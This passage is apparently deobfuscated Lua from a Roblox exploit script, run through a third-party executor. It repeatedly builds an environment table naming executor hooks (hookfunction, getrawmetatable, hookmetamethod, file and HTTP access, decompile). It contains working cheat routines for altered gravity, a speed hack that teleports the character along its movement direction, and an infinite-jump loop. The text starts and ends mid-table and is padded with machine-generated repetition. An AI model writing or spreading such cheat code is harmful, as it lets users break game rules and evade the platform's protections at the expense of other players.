        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Cache._G = Cache
        Cache.GravityValue = Buffer
        if getgenv(select(3, ...)).GravityEnabled then
            workspace.Gravity = Buffer
        end
    end
end

local function Job2(Payload)
    local Element = tonumber(Payload)
    if Element then
        x3.RunSpeed = Element
        return Payload, Element, x3
    else
        return
    end
end

local function Job3(speedRun)
    local Element2 = {
    print = print,
    type = type,
    tostring = tostring,
    tonumber = tonumber,
    next = next,
    pairs = pairs,
    ipairs = ipairs,
    select = select,
    rawget = rawget,
    rawset = rawset,
    rawequal = rawequal,
    rawlen = rawlen,
    setmetatable = setmetatable,
    getmetatable = getmetatable,
    assert = assert,
    error = error,
    pcall = pcall,
    xpcall = xpcall,
    unpack = unpack,
    getfenv = getfenv,
    setfenv = setfenv,
    collectgarbage = collectgarbage,
    gcinfo = gcinfo,
    newproxy = newproxy,
    require = require,
    load = load,
    loadstring = load,
    _VERSION = "Lua 5.1",
    string = string,
    table = table,
    math = math,
    bit32 = bit32,
    bit = bit32,
    os = os,
    io = io,
    utf8 = utf8,
    debug = debug,
    coroutine = coroutine,
    buffer = buffer,
    game = game,
    Game = game,
    workspace = workspace,
    Workspace = workspace,
    script = script,
    shared = shared,
    plugin = plugin,
    Instance = Instance,
    Vector2 = Vector2,
    Vector3 = Vector3,
    Vector2int16 = Vector2int16,
    Vector3int16 = Vector3int16,
    CFrame = CFrame,
    Color3 = Color3,
    UDim = UDim,
    UDim2 = UDim2,
    Rect = Rect,
    Region3 = Region3,
    Ray = Ray,
    NumberRange = NumberRange,
    NumberSequence = NumberSequence,
    NumberSequenceKeypoint = NumberSequenceKeypoint,
    ColorSequence = ColorSequence,
    ColorSequenceKeypoint = ColorSequenceKeypoint,
    BrickColor = BrickColor,
    TweenInfo = TweenInfo,
    PhysicalProperties = PhysicalProperties,
    Faces = Faces,
    Axes = Axes,
    Random = Random,
    DateTime = DateTime,
    Font = Font,
    OverlapParams = OverlapParams,
    RaycastParams = RaycastParams,
    Enum = Enum,
    wait = wait,
    tick = tick,
    time = time,
    elapsedTime = elapsedTime,
    typeof = typeof,
    warn = warn,
    spawn = spawn,
    delay = delay,
    task = task,
    getgenv = getgenv,
    getrenv = getrenv,
    getsenv = getsenv,
    getreg = getreg,
    getgc = getgc,
    getloadedmodules = getloadedmodules,
    getinstances = getinstances,
    getnilinstances = getnilinstances,
    getscripts = getscripts,
    getconnections = getconnections,
    getrunningscripts = getrunningscripts,
    getcallingscript = getcallingscript,
    gethui = gethui,
    getthreadidentity = getthreadidentity,
    setthreadidentity = setthreadidentity,
    checkcaller = checkcaller,
    islclosure = islclosure,
    iscclosure = iscclosure,
    isourclosure = isourclosure,
    is_synapse_function = is_synapse_function,
    clonefunction = clonefunction,
    cloneref = cloneref,
    compareinstances = compareinstances,
    newcclosure = newcclosure,
    hookfunction = hookfunction,
    replaceclosure = replaceclosure,
    hookmetamethod = hookmetamethod,
    getrawmetatable = getrawmetatable,
    setrawmetatable = setrawmetatable,
    setreadonly = setreadonly,
    isreadonly = isreadonly,
    make_writeable = make_writeable,
    make_readonly = make_readonly,
    identifyexecutor = identifyexecutor,
    getexecutorname = getexecutorname,
    setclipboard = setclipboard,
    toclipboard = toclipboard,
    setfpscap = setfpscap,
    firetouchinterest = firetouchinterest,
    fireclickdetector = fireclickdetector,
    fireproximityprompt = fireproximityprompt,
    keypress = keypress,
    keyrelease = keyrelease,
    mouse1click = mouse1click,
    mouse1press = mouse1press,
    mouse1release = mouse1release,
    mousemoverel = mousemoverel,
    queue_on_teleport = queue_on_teleport,
    saveinstance = saveinstance,
    decompile = decompile,
    getscriptclosure = getscriptclosure,
    getfunctionhash = getfunctionhash,
    getcustomasset = getcustomasset,
    rconsoleprint = rconsoleprint,
    rconsolename = rconsolename,
    rconsoleclear = rconsoleclear,
    setfflag = setfflag,
    protectgui = protectgui,
    unprotectgui = unprotectgui,
    sethiddenproperty = sethiddenproperty,
    gethiddenproperty = gethiddenproperty,
    isnetworkowner = isnetworkowner,
    isfile = isfile,
    isfolder = isfolder,
    makefolder = makefolder,
    delfile = delfile,
    delfolder = delfolder,
    listfiles = listfiles,
    readfile = readfile,
    writefile = writefile,
    appendfile = appendfile,
    loadfile = loadfile,
    dofile = dofile,
    request = request,
    http_request = request,
    crypt = crypt,
    base64_encode = base64_encode,
    base64_decode = base64_decode,
    base64encode = base64_encode,
    base64decode = base64_decode,
    syn = syn,
    WebSocket = WebSocket,
    Drawing = Drawing,
    DrawingImmediate = Drawing,
    }
    Element2._G = Element2
    Element2.SpeedRun = speedRun
    return speedRun, Element2
end

local function getValue3()
    local RunSpeedor50 = x4
    local SpeedRun = x4.SpeedRun
    local Element3
    if SpeedRun then
        SpeedRun = game.Players.LocalPlayer.Character
        Element3 = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Element3._G = Element3
        RunSpeedor50 = Element3.RunSpeed or 50
        if SpeedRun and SpeedRun:FindFirstChild("Humanoid") and 0 < SpeedRun.Humanoid.MoveDirection.Magnitude then
            SpeedRun:TranslateBy(SpeedRun.Humanoid.MoveDirection * RunSpeedor50 / 0.5)
            return SpeedRun, RunSpeedor50
        else
            return
        end
    else
        return SpeedRun, RunSpeedor50
    end
end

local function Job4(infiniteJump)
    local function Job5(...)
        local UserInputService = game:GetService("UserInputService")
        local Players = game.Players
        local LocalPlayer = Players.LocalPlayer
        local Element4 = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Element4._G = Element4
        local Humanoid5 = Element4
        local __cont1 = false
        while true do
            Players = Humanoid5.InfiniteJump
            if Players then
                Players = task.wait
                Humanoid5 = 0.05
                Players(0.05)
                while true do
                    if not UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                        Humanoid5 = getgenv(select(3, ...))
                        Players = Humanoid5.InfiniteJump
                        break
                    end
                    Players = LocalPlayer.Character
                    if not Players then
                        Humanoid5 = getgenv(select(3, ...))
                        Players = Humanoid5.InfiniteJump
                        break
                    end
                    Humanoid5 = Players:FindFirstChild("Humanoid")
                    if not Humanoid5 then
                        Humanoid5 = getgenv(select(3, ...))
                        Players = Humanoid5.InfiniteJump
                        if Players then
                            Players = task.wait
                            Humanoid5 = 0.05
                            Players(0.05)
                            continue
                        end
                        break
                    end
                    Humanoid5:ChangeState(Enum.HumanoidStateType.Jumping)
                    Element4 = {
                    print = print,
                    type = type,
                    tostring = tostring,
                    tonumber = tonumber,
                    next = next,
                    pairs = pairs,
                    ipairs = ipairs,
                    select = select,
                    rawget = rawget,
                    rawset = rawset,
                    rawequal = rawequal,
                    rawlen = rawlen,
                    setmetatable = setmetatable,
                    getmetatable = getmetatable,
                    assert = assert,
                    error = error,
                    pcall = pcall,
                    xpcall = xpcall,
                    unpack = unpack,
                    getfenv = getfenv,
                    setfenv = setfenv,
                    collectgarbage = collectgarbage,
                    gcinfo = gcinfo,
                    newproxy = newproxy,
                    require = require,
                    load = load,
                    loadstring = load,
                    _VERSION = "Lua 5.1",
                    string = string,
                    table = table,
                    math = math,
                    bit32 = bit32,
                    bit = bit32,
                    os = os,
                    io = io,
                    utf8 = utf8,
                    debug = debug,
                    coroutine = coroutine,
                    buffer = buffer,
                    game = game,
                    Game = game,
                    workspace = workspace,
                    Workspace = workspace,
                    script = script,
                    shared = shared,
                    plugin = plugin,
                    Instance = Instance,
                    Vector2 = Vector2,
                    Vector3 = Vector3,
                    Vector2int16 = Vector2int16,
                    Vector3int16 = Vector3int16,
                    CFrame = CFrame,
                    Color3 = Color3,
                    UDim = UDim,
                    UDim2 = UDim2,
                    Rect = Rect,
                    Region3 = Region3,
                    Ray = Ray,
                    NumberRange = NumberRange,
                    NumberSequence = NumberSequence,
                    NumberSequenceKeypoint = NumberSequenceKeypoint,
                    ColorSequence = ColorSequence,
                    ColorSequenceKeypoint = ColorSequenceKeypoint,
                    BrickColor = BrickColor,
                    TweenInfo = TweenInfo,
                    PhysicalProperties = PhysicalProperties,
                    Faces = Faces,
                    Axes = Axes,
                    Random = Random,
                    DateTime = DateTime,
                    Font = Font,
                    OverlapParams = OverlapParams,
                    RaycastParams = RaycastParams,
                    Enum = Enum,
                    wait = wait,
                    tick = tick,
                    time = time,
                    elapsedTime = elapsedTime,
                    typeof = typeof,
                    warn = warn,
                    spawn = spawn,
                    delay = delay,
                    task = task,
                    getgenv = getgenv,
                    getrenv = getrenv,
                    getsenv = getsenv,
                    getreg = getreg,
                    getgc = getgc,
                    getloadedmodules = getloadedmodules,
                    getinstances = getinstances,
                    getnilinstances = getnilinstances,
                    getscripts = getscripts,
                    getconnections = getconnections,
                    getrunningscripts = getrunningscripts,
                    getcallingscript = getcallingscript,
                    gethui = gethui,
                    getthreadidentity = getthreadidentity,
                    setthreadidentity = setthreadidentity,
                    checkcaller = checkcaller,
                    islclosure = islclosure,
                    iscclosure = iscclosure,
                    isourclosure = isourclosure,
                    is_synapse_function = is_synapse_function,
                    clonefunction = clonefunction,
                    cloneref = cloneref,
                    compareinstances = compareinstances,
                    newcclosure = newcclosure,
                    hookfunction = hookfunction,
                    replaceclosure = replaceclosure,
                    hookmetamethod = hookmetamethod,
                    getrawmetatable = getrawmetatable,
                    setrawmetatable = setrawmetatable,
                    setreadonly = setreadonly,
                    isreadonly = isreadonly,
                    make_writeable = make_writeable,
                    make_readonly = make_readonly,
                    identifyexecutor = identifyexecutor,
                    getexecutorname = getexecutorname,
                    setclipboard = setclipboard,
                    toclipboard = toclipboard,
                    setfpscap = setfpscap,
                    firetouchinterest = firetouchinterest,
                    fireclickdetector = fireclickdetector,
                    fireproximityprompt = fireproximityprompt,
                    keypress = keypress,
                    keyrelease = keyrelease,
                    mouse1click = mouse1click,
                    mouse1press = mouse1press,
                    mouse1release = mouse1release,
                    mousemoverel = mousemoverel,
                    queue_on_teleport = queue_on_teleport,
                    saveinstance = saveinstance,
                    decompile = decompile,
                    getscriptclosure = getscriptclosure,
                    getfunctionhash = getfunctionhash,
                    getcustomasset = getcustomasset,
                    rconsoleprint = rconsoleprint,
                    rconsolename = rconsolename,
                    rconsoleclear = rconsoleclear,
                    setfflag = setfflag,
                    protectgui = protectgui,
                    unprotectgui = unprotectgui,
                    sethiddenproperty = sethiddenproperty,
                    gethiddenproperty = gethiddenproperty,
                    isnetworkowner = isnetworkowner,
                    isfile = isfile,
                    isfolder = isfolder,
                    makefolder = makefolder,
                    delfile = delfile,
                    delfolder = delfolder,
                    listfiles = listfiles,
                    readfile = readfile,
                    writefile = writefile,
                    appendfile = appendfile,
                    loadfile = loadfile,
                    dofile = dofile,
                    request = request,
                    http_request = request,
                    crypt = crypt,
                    base64_encode = base64_encode,
                    base64_decode = base64_decode,
                    base64encode = base64_encode,
                    base64decode = base64_decode,
                    syn = syn,
                    WebSocket = WebSocket,
                    Drawing = Drawing,
                    DrawingImmediate = Drawing,
                    }
                    Element4._G = Element4
                    Humanoid5 = Element4
                    __cont1 = true
                    break
                end
                if __cont1 then
                    __cont1 = false
                    continue
                end
                return UserInputService, LocalPlayer
            end
            break
        end
        return UserInputService, LocalPlayer, Players, Humanoid5
    end
    local Element5 = {
    print = print,
    type = type,
    tostring = tostring,
    tonumber = tonumber,
    next = next,
    pairs = pairs,
    ipairs = ipairs,
    select = select,
    rawget = rawget,
    rawset = rawset,
    rawequal = rawequal,
    rawlen = rawlen,
    setmetatable = setmetatable,
    getmetatable = getmetatable,
    assert = assert,
    error = error,
    pcall = pcall,
    xpcall = xpcall,
    unpack = unpack,
    getfenv = getfenv,
    setfenv = setfenv,
    collectgarbage = collectgarbage,
    gcinfo = gcinfo,
    newproxy = newproxy,
    require = require,
    load = load,
    loadstring = load,
    _VERSION = "Lua 5.1",
    string = string,
    table = table,
    math = math,
    bit32 = bit32,
    bit = bit32,
    os = os,
    io = io,
    utf8 = utf8,
    debug = debug,
    coroutine = coroutine,
    buffer = buffer,
    game = game,
    Game = game,
    workspace = workspace,
    Workspace = workspace,
    script = script,
    shared = shared,
    plugin = plugin,
    Instance = Instance,
    Vector2 = Vector2,
    Vector3 = Vector3,
    Vector2int16 = Vector2int16,
    Vector3int16 = Vector3int16,
    CFrame = CFrame,
    Color3 = Color3,
    UDim = UDim,
    UDim2 = UDim2,
    Rect = Rect,
    Region3 = Region3,
    Ray = Ray,
    NumberRange = NumberRange,
    NumberSequence = NumberSequence,
    NumberSequenceKeypoint = NumberSequenceKeypoint,
    ColorSequence = ColorSequence,
    ColorSequenceKeypoint = ColorSequenceKeypoint,
    BrickColor = BrickColor,
    TweenInfo = TweenInfo,
    PhysicalProperties = PhysicalProperties,
    Faces = Faces,
    Axes = Axes,
    Random = Random,
    DateTime = DateTime,
    Font = Font,
    OverlapParams = OverlapParams,
    RaycastParams = RaycastParams,
    Enum = Enum,
    wait = wait,
    tick = tick,
    time = time,
    elapsedTime = elapsedTime,
    typeof = typeof,
    warn = warn,
    spawn = spawn,
    delay = delay,
    task = task,
    getgenv = getgenv,
    getrenv = getrenv,
    getsenv = getsenv,
    getreg = getreg,
    getgc = getgc,
    getloadedmodules = getloadedmodules,
    getinstances = getinstances,
    getnilinstances = getnilinstances,
    getscripts = getscripts,
    getconnections = getconnections,
    getrunningscripts = getrunningscripts,
    getcallingscript = getcallingscript,
    gethui = gethui,
    getthreadidentity = getthreadidentity,
    setthreadidentity = setthreadidentity,
    checkcaller = checkcaller,
    islclosure = islclosure,
    iscclosure = iscclosure,
    isourclosure = isourclosure,
    is_synapse_function = is_synapse_function,
    clonefunction = clonefunction,
    cloneref = cloneref,
    compareinstances = compareinstances,
    newcclosure = newcclosure,
    hookfunction = hookfunction,
    replaceclosure = replaceclosure,
    hookmetamethod = hookmetamethod,
    getrawmetatable = getrawmetatable,
    setrawmetatable = setrawmetatable,
    setreadonly = setreadonly,
    isreadonly = isreadonly,
    make_writeable = make_writeable,
    make_readonly = make_readonly,
    identifyexecutor = identifyexecutor,
    getexecutorname = getexecutorname,
    setclipboard = setclipboard,
    toclipboard = toclipboard,
    setfpscap = setfpscap,
    firetouchinterest = firetouchinterest,
    fireclickdetector = fireclickdetector,
    fireproximityprompt = fireproximityprompt,
    keypress = keypress,
    keyrelease = keyrelease,
    mouse1click = mouse1click,
    mouse1press = mouse1press,
    mouse1release = mouse1release,
    mousemoverel = mousemoverel,
    queue_on_teleport = queue_on_teleport,
    saveinstance = saveinstance,
    decompile = decompile,
    getscriptclosure = getscriptclosure,
    getfunctionhash = getfunctionhash,
    getcustomasset = getcustomasset,
    rconsoleprint = rconsoleprint,
    rconsolename = rconsolename,
    rconsoleclear = rconsoleclear,
    setfflag = setfflag,
    protectgui = protectgui,
    unprotectgui = unprotectgui,
    sethiddenproperty = sethiddenproperty,
    gethiddenproperty = gethiddenproperty,
    isnetworkowner = isnetworkowner,
    isfile = isfile,
    isfolder = isfolder,
    makefolder = makefolder,
    delfile = delfile,
    delfolder = delfolder,
    listfiles = listfiles,
    readfile = readfile,
    writefile = writefile,
    appendfile = appendfile,
    loadfile = loadfile,
    dofile = dofile,
    request = request,
    http_request = request,
    crypt = crypt,
    base64_encode = base64_encode,
    base64_decode = base64_decode,
    base64encode = base64_encode,
    base64decode = base64_decode,
    syn = syn,
    WebSocket = WebSocket,
    Drawing = Drawing,
    DrawingImmediate = Drawing,
    }
    Element5._G = Element5
    local Element6 = Element5
    Element5.InfiniteJump = infiniteJump
    if infiniteJump then
        task.spawn(Job5)
        return infiniteJump
    else
        return infiniteJump, Element6
    end
end

local function Job6(Context)
    local function Job7(...)
        local LocalPlayer2 = game.Players.LocalPlayer
        local Pack = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
